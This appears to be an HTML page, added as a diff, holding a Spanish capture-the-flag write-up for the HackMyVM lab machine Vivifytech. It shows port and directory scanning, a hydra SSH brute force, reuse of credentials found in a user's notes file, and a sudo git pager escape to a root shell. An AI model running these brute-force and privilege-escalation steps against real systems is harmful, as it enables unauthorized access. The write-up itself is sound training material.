@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="es"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">HackMyVM - Vivifytech | noname</title>
+<meta property="og:title" content="HackMyVM - Vivifytech | noname" />
+<meta name="twitter:title" content="HackMyVM - Vivifytech | noname" />
+<meta itemprop="name" content="HackMyVM - Vivifytech | noname" />
+<meta name="application-name" content="HackMyVM - Vivifytech | noname" />
+<meta property="og:site_name" content="" />
+
+<meta name="description" content="Writeup Vivifytech 🟢">
+<meta itemprop="description" content="Writeup Vivifytech 🟢" />
+<meta property="og:description" content="Writeup Vivifytech 🟢" />
+<meta name="twitter:description" content="Writeup Vivifytech 🟢" />
+
+<meta property="og:locale" content="es" />
+<meta name="language" content="es" />
+
+  <link rel="alternate" hreflang="en" href="https://0x-noname.github.io/writeups/hmv/vivifytech/" title="" />
+
+
+
+  <meta itemprop="image" content="https://0x-noname.github.io/machines/hmv/vivifytech/vivifytech_logo.webp" />
+  <meta property="og:image" content="https://0x-noname.github.io/machines/hmv/vivifytech/vivifytech_logo.webp" />
+  <meta name="twitter:image" content="https://0x-noname.github.io/machines/hmv/vivifytech/vivifytech_logo.webp" />
+  <meta name="twitter:image:src" content="https://0x-noname.github.io/machines/hmv/vivifytech/vivifytech_logo.webp" />
+
+
+
+
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2024-01-05T00:01:08&#43;0200 />
+    <meta property="article:published_time" content=2024-01-05T00:01:08&#43;0200 />
+
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "HackMyVM - Vivifytech",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2024-01-05",
+        "description": "Writeup Vivifytech 🟢",
+        "wordCount":  725 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2024-01-05",
+        "image": {
+        "@type": "imageObject",
+        "url": "\/machines\/hmv\/vivifytech\/vivifytech_logo.webp"
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "noname"
+        }
+    }
+    </script>
+
+
+
+<meta name="generator" content="Hugo 0.125.7">
+
+    
+
+    <link rel="canonical" href="https://0x-noname.github.io/writeups/hmv/vivifytech/">
+    <link href="/style.min.d43bc6c79baa87f006efb2b92be952faeedeb1a3ab626c1d6abda52eae049355.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="https://0x-noname.github.io/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    
+  
+
+</head>
+<body data-theme = "" class="notransition">
+
+<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="https://0x-noname.github.io/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title></title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        $ home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/posts/hackmyvm/">
+                        $ hmv
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/posts/hackthebox/">
+                        $ htb
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/posts/vulnyx/">
+                        $ nyx
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/whoami/">
+                        $ whoami
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">HackMyVM - Vivifytech</h1>
+                
+                
+                <div class="post-meta">
+                    <time datetime="2024-01-05T00:01:08&#43;02:00" itemprop="datePublished"> Jan 5, 2024 </time>
+                </div>
+                
+            </header>
+            
+            <div class="page-content">
+                <p><img src="/../machines/hmv/vivifytech/vivifytech_logo.webp" alt="logo"></p>
+<ul>
+<li><em>Brute Force SSH - (Hydra)</em></li>
+<li><em>Information Leakage - (User Pivoting)</em></li>
+<li><em>Abuse Git Binary - (Sudo Privesc)</em></li>
+</ul>
+<h3 id="escaneo-de-puertos">Escaneo de puertos</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ nmap -p- -T5 -n -v 192.168.1.12
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE
+</span></span><span class="line"><span class="cl">22/tcp    open  ssh
+</span></span><span class="line"><span class="cl">80/tcp    open  http
+</span></span><span class="line"><span class="cl">3306/tcp  open  mysql
+</span></span><span class="line"><span class="cl">33060/tcp open  mysqlx
+</span></span></code></pre></div><h3 id="escaneo-de-servicios">Escaneo de servicios</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ nmap -sVC -v -p 22,80,3306,33060 192.168.1.12
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp    open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
+</span></span><span class="line"><span class="cl">| ssh-hostkey: 
+</span></span><span class="line"><span class="cl">|   256 32:f3:f6:36:95:12:c8:18:f3:ad:b8:0f:04:4d:73:2f (ECDSA)
+</span></span><span class="line"><span class="cl">|_  256 1d:ec:9c:6e:3c:cf:83:f6:f0:45:22:58:13:2f:d3:9e (ED25519)
+</span></span><span class="line"><span class="cl">80/tcp    open  http    Apache httpd 2.4.57 ((Debian))
+</span></span><span class="line"><span class="cl">|_http-server-header: Apache/2.4.57 (Debian)
+</span></span><span class="line"><span class="cl">|_http-title: Apache2 Debian Default Page: It works
+</span></span><span class="line"><span class="cl">| http-methods: 
+</span></span><span class="line"><span class="cl">|_  Supported Methods: HEAD GET POST OPTIONS
+</span></span><span class="line"><span class="cl">3306/tcp  open  mysql   MySQL (unauthorized)
+</span></span><span class="line"><span class="cl">33060/tcp open  mysqlx?
+</span></span><span class="line"><span class="cl">| fingerprint-strings: 
+</span></span><span class="line"><span class="cl">|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
+</span></span><span class="line"><span class="cl">|     Invalid message&#34;
+</span></span><span class="line"><span class="cl">|     HY000
+</span></span><span class="line"><span class="cl">|   LDAPBindReq: 
+</span></span><span class="line"><span class="cl">|     *Parse error unserializing protobuf message&#34;
+</span></span><span class="line"><span class="cl">|     HY000
+</span></span><span class="line"><span class="cl">|   oracle-tns: 
+</span></span><span class="line"><span class="cl">|     Invalid message-frame.&#34;
+</span></span><span class="line"><span class="cl">|_    HY000
+</span></span><span class="line"><span class="cl">1 service unrecognized despite returning data. If you know the service/version, please 
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><h3 id="http-tcp---80">HTTP TCP - 80</h3>
+<p><img src="/../machines/hmv/vivifytech/http.webp" alt="http"></p>
+<p>Al realizar fuerza bruta de directorios encuentro el directorio <strong>wordpress</strong>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ gobuster dir -u http://192.168.1.12 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</span></span><span class="line"><span class="cl">===============================================================
+</span></span><span class="line"><span class="cl">Gobuster v3.6
+</span></span><span class="line"><span class="cl">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+</span></span><span class="line"><span class="cl">===============================================================
+</span></span><span class="line"><span class="cl">[+] Url:                     http://192.168.1.12
+</span></span><span class="line"><span class="cl">[+] Method:                  GET
+</span></span><span class="line"><span class="cl">[+] Threads:                 10
+</span></span><span class="line"><span class="cl">[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</span></span><span class="line"><span class="cl">[+] Negative Status codes:   404
+</span></span><span class="line"><span class="cl">[+] User Agent:              gobuster/3.6
+</span></span><span class="line"><span class="cl">[+] Timeout:                 10s
+</span></span><span class="line"><span class="cl">===============================================================
+</span></span><span class="line"><span class="cl">Starting gobuster in directory enumeration mode
+</span></span><span class="line"><span class="cl">===============================================================
+</span></span><span class="line"><span class="cl">/wordpress            (Status: 301) [Size: 316] [--&gt; http://192.168.1.12/wordpress/]
+</span></span></code></pre></div><p>Visualizo la página web.</p>
+<p><img src="/../machines/hmv/vivifytech/wordpress.webp" alt="wordpress"></p>
+<p>Sigo con la enumeración de directorios dentro del directorio <strong>wordpress</strong>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ gobuster dir -u http://192.168.1.12/wordpress -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</span></span><span class="line"><span class="cl">===============================================================
+</span></span><span class="line"><span class="cl">Gobuster v3.6
+</span></span><span class="line"><span class="cl">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+</span></span><span class="line"><span class="cl">===============================================================
+</span></span><span class="line"><span class="cl">[+] Url:                     http://192.168.1.12/wordpress
+</span></span><span class="line"><span class="cl">[+] Method:                  GET
+</span></span><span class="line"><span class="cl">[+] Threads:                 10
+</span></span><span class="line"><span class="cl">[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</span></span><span class="line"><span class="cl">[+] Negative Status codes:   404
+</span></span><span class="line"><span class="cl">[+] User Agent:              gobuster/3.6
+</span></span><span class="line"><span class="cl">[+] Extensions:              php,txt
+</span></span><span class="line"><span class="cl">[+] Timeout:                 10s
+</span></span><span class="line"><span class="cl">===============================================================
+</span></span><span class="line"><span class="cl">Starting gobuster in directory enumeration mode
+</span></span><span class="line"><span class="cl">===============================================================
+</span></span><span class="line"><span class="cl">/wp-content           (Status: 301) [Size: 327] [--&gt; http://192.168.1.12/wordpress/wp-content/]
+</span></span><span class="line"><span class="cl">/license.txt          (Status: 200) [Size: 19915]
+</span></span><span class="line"><span class="cl">/wp-includes          (Status: 301) [Size: 328] [--&gt; http://192.168.1.12/wordpress/wp-includes/]
+</span></span><span class="line"><span class="cl">/wp-trackback.php     (Status: 200) [Size: 135]
+</span></span><span class="line"><span class="cl">/wp-admin             (Status: 301) [Size: 325] [--&gt; http://192.168.1.12/wordpress/wp-admin/]
+</span></span></code></pre></div><p>Tras realizar fuerza bruta de extensiones el directorio <strong>wp-includes</strong> encuentro el archivo <code>secrets.txt</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ gobuster dir -u http://192.168.1.12/wordpress/wp-includes -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt
+</span></span><span class="line"><span class="cl">===============================================================
+</span></span><span class="line"><span class="cl">Gobuster v3.6
+</span></span><span class="line"><span class="cl">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+</span></span><span class="line"><span class="cl">===============================================================
+</span></span><span class="line"><span class="cl">[+] Url:                     http://192.168.1.12/wordpress/wp-includes
+</span></span><span class="line"><span class="cl">[+] Method:                  GET
+</span></span><span class="line"><span class="cl">[+] Threads:                 10
+</span></span><span class="line"><span class="cl">[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</span></span><span class="line"><span class="cl">[+] Negative Status codes:   404
+</span></span><span class="line"><span class="cl">[+] User Agent:              gobuster/3.6
+</span></span><span class="line"><span class="cl">[+] Extensions:              txt
+</span></span><span class="line"><span class="cl">[+] Timeout:                 10s
+</span></span><span class="line"><span class="cl">===============================================================
+</span></span><span class="line"><span class="cl">Starting gobuster in directory enumeration mode
+</span></span><span class="line"><span class="cl">===============================================================
+</span></span><span class="line"><span class="cl">/images               (Status: 301) [Size: 335] [--&gt; http://192.168.1.12/wordpress/wp-includes/images/]
+</span></span><span class="line"><span class="cl">/assets               (Status: 301) [Size: 335] [--&gt; http://192.168.1.12/wordpress/wp-includes/assets/]
+</span></span><span class="line"><span class="cl">/css                  (Status: 301) [Size: 332] [--&gt; http://192.168.1.12/wordpress/wp-includes/css/]
+</span></span><span class="line"><span class="cl">/js                   (Status: 301) [Size: 331] [--&gt; http://192.168.1.12/wordpress/wp-includes/js/]
+</span></span><span class="line"><span class="cl">/blocks               (Status: 301) [Size: 335] [--&gt; http://192.168.1.12/wordpress/wp-includes/blocks/]
+</span></span><span class="line"><span class="cl">/widgets              (Status: 301) [Size: 336] [--&gt; http://192.168.1.12/wordpress/wp-includes/widgets/]
+</span></span><span class="line"><span class="cl">/fonts                (Status: 301) [Size: 334] [--&gt; http://192.168.1.12/wordpress/wp-includes/fonts/]
+</span></span><span class="line"><span class="cl">/customize            (Status: 301) [Size: 338] [--&gt; http://192.168.1.12/wordpress/wp-includes/customize/]
+</span></span><span class="line"><span class="cl">/certificates         (Status: 301) [Size: 341] [--&gt; http://192.168.1.12/wordpress/wp-includes/certificates/]
+</span></span><span class="line"><span class="cl">/secrets.txt          (Status: 200) [Size: 439]
+</span></span></code></pre></div><p>Al visualizar el <code>secrets.txt</code> me encuentro con una lista de palabras que usaré como diccionario.</p>
+<p><img src="/../machines/hmv/vivifytech/secrets.webp" alt="secrets"></p>
+<p>Entro el post <strong>The story behing VivifyTech</strong>.</p>
+<p><img src="/../machines/hmv/vivifytech/posts.webp" alt="posts"></p>
+<p>Enumero varios usuarios.</p>
+<p><img src="/../machines/hmv/vivifytech/users.webp" alt="users"></p>
+<p>Creo el archivo <code>users.txt</code> con el siguiente contenido.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Sarah
+</span></span><span class="line"><span class="cl">Mark
+</span></span><span class="line"><span class="cl">Emily
+</span></span><span class="line"><span class="cl">Jake
+</span></span><span class="line"><span class="cl">Alex
+</span></span><span class="line"><span class="cl">sarah
+</span></span><span class="line"><span class="cl">mark
+</span></span><span class="line"><span class="cl">emily
+</span></span><span class="line"><span class="cl">jake
+</span></span><span class="line"><span class="cl">alex
+</span></span></code></pre></div><p>Realizo fuerza bruta al servicio <strong>SSH</strong> con los diccionarios creados.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ hydra -L users.txt -P secrets.txt ssh://192.168.1.12 -F -I -V
+</span></span><span class="line"><span class="cl">[22][ssh] host: 192.168.1.12   login: sarah   password: b*****n
+</span></span></code></pre></div><p>Me conecto al sistema con las credenciales encontradas.</p>
+<p><img src="/../machines/hmv/vivifytech/sarah.webp" alt="sarah"></p>
+<p>Lanzo un <code>ls -la</code> y veo una carpeta oculta que me llama la atención.</p>
+<p><img src="/../machines/hmv/vivifytech/ls.webp" alt="ls"></p>
+<p>Al visualizar el contenido de <code>Tasks.txt</code> encuentro las credenciales de <strong>gbodja</strong>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">sarah@VivifyTech:~/.private$ cat Tasks.txt 
+</span></span><span class="line"><span class="cl">- Change the Design and architecture of the website
+</span></span><span class="line"><span class="cl">- Plan for an audit, it seems like our website is vulnerable
+</span></span><span class="line"><span class="cl">- Remind the team we need to schedule a party before going to holidays
+</span></span><span class="line"><span class="cl">- Give this cred to the new intern for some tasks assigned to him - gbodja:4************N
+</span></span></code></pre></div><p>Me logueo como usuario <strong>gbodja</strong>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">sarah@VivifyTech:~/.private$ su gbodja
+</span></span><span class="line"><span class="cl">Password: 
+</span></span><span class="line"><span class="cl">gbodja@VivifyTech:/home/sarah/.private$ id
+</span></span><span class="line"><span class="cl">uid=1002(gbodja) gid=1002(gbodja) groups=1002(gbodja),100(users)
+</span></span></code></pre></div><p>Enumero permisos de sudo.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">gbodja@VivifyTech:~$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries for gbodja on VivifyTech:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, !admin_flag, use_pty
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User gbodja may run the following commands on VivifyTech:
+</span></span><span class="line"><span class="cl">    (ALL) NOPASSWD: /usr/bin/git
+</span></span></code></pre></div><p>Con la herramienta <code>gtfobins-cli.py</code> puedo ver que hay varias formas de usar git, yo usaré el segundo método.</p>
+<p><img src="/../machines/hmv/vivifytech/gtfobinsGit.webp" alt="gtfobinsGit"></p>
+<p>Lanzo el binario <strong>git</strong> como me indica <strong>gtfobins</strong>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">gbodja@VivifyTech:~$ sudo /usr/bin/git -p help config
+</span></span></code></pre></div><p>Me muestra la ayuda de la herramienta y al final escribo <code>!/bin/bash</code>.</p>
+<p><img src="/../machines/hmv/vivifytech/gitPrivesc.webp" alt="gitPrivesc"></p>
+<p>Al pulsar enter obtengo el root.</p>
+<p><img src="/../machines/hmv/vivifytech/root.webp" alt="root"></p>
+<p>Y aquí termina la máquina Vivifitech.</p>
+<p>Saludos!</p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/0x-noname" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2024 .
+        
+    </small>
+</footer><a href="#" title="" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+
+
+    
+    <script src="https://0x-noname.github.io/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>
+
+    
+
+</body>
+</html>
